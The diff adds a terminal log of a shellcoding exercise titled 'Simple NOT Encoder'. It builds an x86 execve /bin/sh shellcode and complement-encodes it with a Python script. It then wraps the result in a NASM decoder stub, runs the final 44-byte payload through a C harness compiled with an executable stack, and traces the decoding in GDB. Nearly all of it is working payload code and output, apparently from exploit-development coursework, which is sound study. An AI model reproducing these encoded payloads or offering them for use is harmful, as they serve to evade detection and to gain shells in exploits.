@@ -1,0 +1,377 @@
+Simple NOT Encoder
+
+1.) Assemble and run
+kan1shka9@dev:~/Desktop/Remain/30$ ls
+compile_ld.sh  execve-stack-sh.nasm
+kan1shka9@dev:~/Desktop/Remain/30$ ./compile_ld.sh execve-stack-sh
+[+] Assebling with Nasm ...
+[+] Linking ...
+[+] Done!
+kan1shka9@dev:~/Desktop/Remain/30$ ls
+compile_ld.sh  execve-stack-sh  execve-stack-sh.nasm  execve-stack-sh.o
+kan1shka9@dev:~/Desktop/Remain/30$ objdump -d ./execve-stack-sh|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+kan1shka9@dev:~/Desktop/Remain/30$ cp ../28/shellcode.c .
+kan1shka9@dev:~/Desktop/Remain/30$ ls
+compile_ld.sh  execve-stack-sh  execve-stack-sh.nasm  execve-stack-sh.o  shellcode.c
+kan1shka9@dev:~/Desktop/Remain/30$ nano shellcode.c
+kan1shka9@dev:~/Desktop/Remain/30$ cat -n shellcode.c
+     1  #include<stdio.h>
+     2  #include<string.h>
+     3
+     4  unsigned char code[] = \
+     5  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
+     6
+     7  main()
+     8  {
+     9
+    10      printf("Shellcode length: %d\n", strlen(code));
+    11
+    12      int (*ret)() = (int(*)())code;
+    13
+    14      ret();
+    15
+    16  }
+kan1shka9@dev:~/Desktop/Remain/30$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
+kan1shka9@dev:~/Desktop/Remain/30$ ./shellcode
+Shellcode length: 25
+$ ps
+  PID TTY          TIME CMD
+ 3373 pts/9    00:00:03 bash
+ 5619 pts/9    00:00:00 sh
+ 5620 pts/9    00:00:00 ps
+$ exit
+
+2.) NOT encoder in python
+kan1shka9@dev:~/Desktop/Remain/30$ cat -n NOT_encoder.py
+     1  #!/usr/bin/python
+     2
+     3  # Python Complement Encoder
+     4
+     5  shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
+     6
+     7  encoded = ""
+     8  encoded2 = ""
+     9
+    10  print 'Encoded shellcode ...'
+    11
+    12  for x in bytearray(shellcode) :
+    13          # Complement Encoding
+    14          y = ~x
+    15
+    16          encoded += '\\x'
+    17          encoded += '%02x' % (y & 0xff)
+    18
+    19          encoded2 += '0x'
+    20          encoded2 += '%02x,' %(y & 0xff)
+    21
+    22  print encoded
+    23
+    24  print encoded2
+    25
+    26  print 'Len: %d' % len(bytearray(shellcode))
+kan1shka9@dev:~/Desktop/Remain/30$ python NOT_encoder.py
+Encoded shellcode ...
+\xce\x3f\xaf\x97\xd0\xd0\x8c\x97\x97\xd0\x9d\x96\x91\x76\x1c\xaf\x76\x1d\xac\x76\x1e\x4f\xf4\x32\x7f
+0xce,0x3f,0xaf,0x97,0xd0,0xd0,0x8c,0x97,0x97,0xd0,0x9d,0x96,0x91,0x76,0x1c,0xaf,0x76,0x1d,0xac,0x76,0x1e,0x4f,0xf4,0x32,0x7f,
+Len: 25
+kan1shka9@dev:~/Desktop/Remain/30$
+
+3.) Assemble and run. Check for null bytes.
+kan1shka9@dev:~/Desktop/Remain/30$ ./compile_ld.sh not-decoder
+[+] Assebling with Nasm ...
+[+] Linking ...
+[+] Done!
+kan1shka9@dev:~/Desktop/Remain/30$ ls
+compile_ld.sh  execve-stack-sh  execve-stack-sh.nasm  execve-stack-sh.o  not-decoder  not-decoder.nasm  not-decoder.o  NOT_encoder.py  shellcode  shellcode.c
+kan1shka9@dev:~/Desktop/Remain/30$ ./not-decoder
+Segmentation fault (core dumped)
+kan1shka9@dev:~/Desktop/Remain/30$ objdump -d not-decoder -M intel
+
+not-decoder:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:       eb 0c                   jmp    804806e <call_shellcode>
+
+08048062 <decoder>:
+ 8048062:       5e                      pop    esi
+ 8048063:       31 c9                   xor    ecx,ecx
+ 8048065:       b1 19                   mov    cl,0x19
+
+08048067 <decode>:
+ 8048067:       f6 16                   not    BYTE PTR [esi]
+ 8048069:       46                      inc    esi
+ 804806a:       e2 fb                   loop   8048067 <decode>
+ 804806c:       eb 05                   jmp    8048073 <EncodedShellcode>
+
+0804806e <call_shellcode>:
+ 804806e:       e8 ef ff ff ff          call   8048062 <decoder>
+
+08048073 <EncodedShellcode>:
+ 8048073:       ce                      into
+ 8048074:       3f                      aas
+ 8048075:       af                      scas   eax,DWORD PTR es:[edi]
+ 8048076:       97                      xchg   edi,eax
+ 8048077:       d0 d0                   rcl    al,1
+ 8048079:       8c 97 97 d0 9d 96       mov    WORD PTR [edi-0x69622f69],ss
+ 804807f:       91                      xchg   ecx,eax
+ 8048080:       76 1c                   jbe    804809e <EncodedShellcode+0x2b>
+ 8048082:       af                      scas   eax,DWORD PTR es:[edi]
+ 8048083:       76 1d                   jbe    80480a2 <EncodedShellcode+0x2f>
+ 8048085:       ac                      lods   al,BYTE PTR ds:[esi]
+ 8048086:       76 1e                   jbe    80480a6 <EncodedShellcode+0x33>
+ 8048088:       4f                      dec    edi
+ 8048089:       f4                      hlt
+ 804808a:       32                      .byte 0x32
+ 804808b:       7f                      .byte 0x7f
+kan1shka9@dev:~/Desktop/Remain/30$
+
+4.) Preparing shellcode
+kan1shka9@dev:~/Desktop/Remain/30$ objdump -d ./not-decoder|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\xeb\x0c\x5e\x31\xc9\xb1\x19\xf6\x16\x46\xe2\xfb\xeb\x05\xe8\xef\xff\xff\xff\xce\x3f\xaf\x97\xd0\xd0\x8c\x97\x97\xd0\x9d\x96\x91\x76\x1c\xaf\x76\x1d\xac\x76\x1e\x4f\xf4\x32\x7f"
+kan1shka9@dev:~/Desktop/Remain/30$ ls
+compile_ld.sh  execve-stack-sh  execve-stack-sh.nasm  execve-stack-sh.o  not-decoder  not-decoder.nasm  not-decoder.o  NOT_encoder.py  shellcode  shellcode.c
+kan1shka9@dev:~/Desktop/Remain/30$ cp shellcode.c shellcode-not.c
+kan1shka9@dev:~/Desktop/Remain/30$ nano shellcode-not.c
+kan1shka9@dev:~/Desktop/Remain/30$ cat -n shellcode-not.c
+     1  #include<stdio.h>
+     2  #include<string.h>
+     3
+     4  unsigned char code[] = \
+     5  "\xeb\x0c\x5e\x31\xc9\xb1\x19\xf6\x16\x46\xe2\xfb\xeb\x05\xe8\xef\xff\xff\xff\xce\x3f\xaf\x97\xd0\xd0\x8c\x97\x97\xd0\x9d\x96\x91\x76\x1c\xaf\x76\x1d\xac\x76\x1e\x4f\xf4\x32\x7f";
+     6
+     7  main()
+     8  {
+     9
+    10      printf("Shellcode length: %d\n", strlen(code));
+    11
+    12      int (*ret)() = (int(*)())code;
+    13
+    14      ret();
+    15
+    16  }
+kan1shka9@dev:~/Desktop/Remain/30$ gcc -fno-stack-protector -z execstack shellcode-not.c -o shellcode-not
+kan1shka9@dev:~/Desktop/Remain/30$ ls
+compile_ld.sh  execve-stack-sh  execve-stack-sh.nasm  execve-stack-sh.o  not-decoder  not-decoder.nasm  not-decoder.o  NOT_encoder.py  shellcode  shellcode.c  shellcode-not  shellcode-not.c
+kan1shka9@dev:~/Desktop/Remain/30$ ./shellcode-not
+Shellcode length: 44
+$ ps
+  PID TTY          TIME CMD
+ 3373 pts/9    00:00:04 bash
+ 5891 pts/9    00:00:00 sh
+ 5893 pts/9    00:00:00 ps
+$ exit
+kan1shka9@dev:~/Desktop/Remain/30$
+
+5.) Analyse using GDB
+kan1shka9@dev:~/Desktop/Remain/30$ gdb -q ./shellcode-not
+Reading symbols from ./shellcode-not...(no debugging symbols found)...done.
+(gdb) set disassembly-flavor intel
+(gdb) break *&code
+Breakpoint 1 at 0x804a040
+(gdb) run
+Starting program: /home/kan1shka9/Desktop/Remain/30/shellcode-not
+Shellcode length: 44
+
+Breakpoint 1, 0x0804a040 in code ()
+(gdb) disassemble
+Dump of assembler code for function code:
+=> 0x0804a040 <+0>:     jmp    0x804a04e <code+14>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     xor    ecx,ecx
+   0x0804a045 <+5>:     mov    cl,0x19
+   0x0804a047 <+7>:     not    BYTE PTR [esi]
+   0x0804a049 <+9>:     inc    esi
+   0x0804a04a <+10>:    loop   0x804a047 <code+7>
+   0x0804a04c <+12>:    jmp    0x804a053 <code+19>
+   0x0804a04e <+14>:    call   0x804a042 <code+2>
+   0x0804a053 <+19>:    into
+   0x0804a054 <+20>:    aas
+   0x0804a055 <+21>:    scas   eax,DWORD PTR es:[edi]
+   0x0804a056 <+22>:    xchg   edi,eax
+   0x0804a057 <+23>:    rcl    al,1
+   0x0804a059 <+25>:    mov    WORD PTR [edi-0x69622f69],ss
+   0x0804a05f <+31>:    xchg   ecx,eax
+   0x0804a060 <+32>:    jbe    0x804a07e
+   0x0804a062 <+34>:    scas   eax,DWORD PTR es:[edi]
+   0x0804a063 <+35>:    jbe    0x804a082
+   0x0804a065 <+37>:    lods   al,BYTE PTR ds:[esi]
+   0x0804a066 <+38>:    jbe    0x804a086
+   0x0804a068 <+40>:    dec    edi
+   0x0804a069 <+41>:    hlt
+   0x0804a06a <+42>:    xor    bh,BYTE PTR [edi+0x0]
+End of assembler dump.
+(gdb) shell cat not-decoder.nasm
+; not-decoder.nasm
+
+global _start
+
+section .text
+_start:
+        jmp short call_shellcode
+
+decoder:
+        pop esi
+        xor ecx, ecx
+        mov cl, 25
+
+decode:
+        not byte [esi]
+        inc esi
+        loop decode
+
+        jmp short EncodedShellcode
+
+call_shellcode:
+
+        call decoder
+        EncodedShellcode: db 0xce,0x3f,0xaf,0x97,0xd0,0xd0,0x8c,0x97,0x97,0xd0,0x9d,0x96,0x91,0x76,0x1c,0xaf,0x76,0x1d,0xac,0x76,0x1e,0x4f,0xf4,0x32,0x7f
+(gdb) x/20xb 0x0804a053
+0x804a053 <code+19>:    0xce    0x3f    0xaf    0x97    0xd0    0xd0    0x8c    0x97
+0x804a05b <code+27>:    0x97    0xd0    0x9d    0x96    0x91    0x76    0x1c    0xaf
+0x804a063 <code+35>:    0x76    0x1d    0xac    0x76
+(gdb) disassemble
+Dump of assembler code for function code:
+=> 0x0804a040 <+0>:     jmp    0x804a04e <code+14>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     xor    ecx,ecx
+   0x0804a045 <+5>:     mov    cl,0x19
+   0x0804a047 <+7>:     not    BYTE PTR [esi]
+   0x0804a049 <+9>:     inc    esi
+   0x0804a04a <+10>:    loop   0x804a047 <code+7>
+   0x0804a04c <+12>:    jmp    0x804a053 <code+19>
+   0x0804a04e <+14>:    call   0x804a042 <code+2>
+   0x0804a053 <+19>:    into
+   0x0804a054 <+20>:    aas
+   0x0804a055 <+21>:    scas   eax,DWORD PTR es:[edi]
+   0x0804a056 <+22>:    xchg   edi,eax
+   0x0804a057 <+23>:    rcl    al,1
+   0x0804a059 <+25>:    mov    WORD PTR [edi-0x69622f69],ss
+   0x0804a05f <+31>:    xchg   ecx,eax
+   0x0804a060 <+32>:    jbe    0x804a07e
+   0x0804a062 <+34>:    scas   eax,DWORD PTR es:[edi]
+   0x0804a063 <+35>:    jbe    0x804a082
+   0x0804a065 <+37>:    lods   al,BYTE PTR ds:[esi]
+   0x0804a066 <+38>:    jbe    0x804a086
+   0x0804a068 <+40>:    dec    edi
+   0x0804a069 <+41>:    hlt
+   0x0804a06a <+42>:    xor    bh,BYTE PTR [edi+0x0]
+End of assembler dump.
+(gdb) x/20i 0x0804a053
+   0x804a053 <code+19>: into
+   0x804a054 <code+20>: aas
+   0x804a055 <code+21>: scas   eax,DWORD PTR es:[edi]
+   0x804a056 <code+22>: xchg   edi,eax
+   0x804a057 <code+23>: rcl    al,1
+   0x804a059 <code+25>: mov    WORD PTR [edi-0x69622f69],ss
+   0x804a05f <code+31>: xchg   ecx,eax
+   0x804a060 <code+32>: jbe    0x804a07e
+   0x804a062 <code+34>: scas   eax,DWORD PTR es:[edi]
+   0x804a063 <code+35>: jbe    0x804a082
+   0x804a065 <code+37>: lods   al,BYTE PTR ds:[esi]
+   0x804a066 <code+38>: jbe    0x804a086
+   0x804a068 <code+40>: dec    edi
+   0x804a069 <code+41>: hlt
+   0x804a06a <code+42>: xor    bh,BYTE PTR [edi+0x0]
+   0x804a06d <completed.6591>:  add    BYTE PTR [eax],al
+   0x804a06f:   add    BYTE PTR [eax],al
+   0x804a071:   add    BYTE PTR [eax],al
+   0x804a073:   add    BYTE PTR [eax],al
+   0x804a075:   add    BYTE PTR [eax],al
+(gdb) disassemble
+Dump of assembler code for function code:
+=> 0x0804a040 <+0>:     jmp    0x804a04e <code+14>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     xor    ecx,ecx
+   0x0804a045 <+5>:     mov    cl,0x19
+   0x0804a047 <+7>:     not    BYTE PTR [esi]
+   0x0804a049 <+9>:     inc    esi
+   0x0804a04a <+10>:    loop   0x804a047 <code+7>
+   0x0804a04c <+12>:    jmp    0x804a053 <code+19>
+   0x0804a04e <+14>:    call   0x804a042 <code+2>
+   0x0804a053 <+19>:    into
+   0x0804a054 <+20>:    aas
+   0x0804a055 <+21>:    scas   eax,DWORD PTR es:[edi]
+   0x0804a056 <+22>:    xchg   edi,eax
+   0x0804a057 <+23>:    rcl    al,1
+   0x0804a059 <+25>:    mov    WORD PTR [edi-0x69622f69],ss
+   0x0804a05f <+31>:    xchg   ecx,eax
+   0x0804a060 <+32>:    jbe    0x804a07e
+   0x0804a062 <+34>:    scas   eax,DWORD PTR es:[edi]
+   0x0804a063 <+35>:    jbe    0x804a082
+   0x0804a065 <+37>:    lods   al,BYTE PTR ds:[esi]
+   0x0804a066 <+38>:    jbe    0x804a086
+   0x0804a068 <+40>:    dec    edi
+   0x0804a069 <+41>:    hlt
+   0x0804a06a <+42>:    xor    bh,BYTE PTR [edi+0x0]
+End of assembler dump.
+(gdb) break *0x0804a04c
+Breakpoint 2 at 0x804a04c
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x0804a04c in code ()
+(gdb) disassemble
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a04e <code+14>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     xor    ecx,ecx
+   0x0804a045 <+5>:     mov    cl,0x19
+   0x0804a047 <+7>:     not    BYTE PTR [esi]
+   0x0804a049 <+9>:     inc    esi
+   0x0804a04a <+10>:    loop   0x804a047 <code+7>
+=> 0x0804a04c <+12>:    jmp    0x804a053 <code+19>
+   0x0804a04e <+14>:    call   0x804a042 <code+2>
+   0x0804a053 <+19>:    xor    eax,eax
+   0x0804a055 <+21>:    push   eax
+   0x0804a056 <+22>:    push   0x68732f2f
+   0x0804a05b <+27>:    push   0x6e69622f
+   0x0804a060 <+32>:    mov    ebx,esp
+   0x0804a062 <+34>:    push   eax
+   0x0804a063 <+35>:    mov    edx,esp
+   0x0804a065 <+37>:    push   ebx
+   0x0804a066 <+38>:    mov    ecx,esp
+   0x0804a068 <+40>:    mov    al,0xb
+   0x0804a06a <+42>:    int    0x80
+   0x0804a06c <+44>:    add    BYTE PTR [eax],al
+End of assembler dump.
+(gdb) stepi
+0x0804a053 in code ()
+(gdb) disassemble
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a04e <code+14>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     xor    ecx,ecx
+   0x0804a045 <+5>:     mov    cl,0x19
+   0x0804a047 <+7>:     not    BYTE PTR [esi]
+   0x0804a049 <+9>:     inc    esi
+   0x0804a04a <+10>:    loop   0x804a047 <code+7>
+   0x0804a04c <+12>:    jmp    0x804a053 <code+19>
+   0x0804a04e <+14>:    call   0x804a042 <code+2>
+=> 0x0804a053 <+19>:    xor    eax,eax
+   0x0804a055 <+21>:    push   eax
+   0x0804a056 <+22>:    push   0x68732f2f
+   0x0804a05b <+27>:    push   0x6e69622f
+   0x0804a060 <+32>:    mov    ebx,esp
+   0x0804a062 <+34>:    push   eax
+   0x0804a063 <+35>:    mov    edx,esp
+   0x0804a065 <+37>:    push   ebx
+   0x0804a066 <+38>:    mov    ecx,esp
+   0x0804a068 <+40>:    mov    al,0xb
+   0x0804a06a <+42>:    int    0x80
+   0x0804a06c <+44>:    add    BYTE PTR [eax],al
+End of assembler dump.
+(gdb) c
+Continuing.
+Shellcode length: 44
+process 6026 is executing new program: /bin/dash
+$ ps
+  PID TTY          TIME CMD
+ 3373 pts/9    00:00:04 bash
+ 6023 pts/9    00:00:01 gdb
+ 6026 pts/9    00:00:00 sh
+ 6030 pts/9    00:00:00 ps
+$
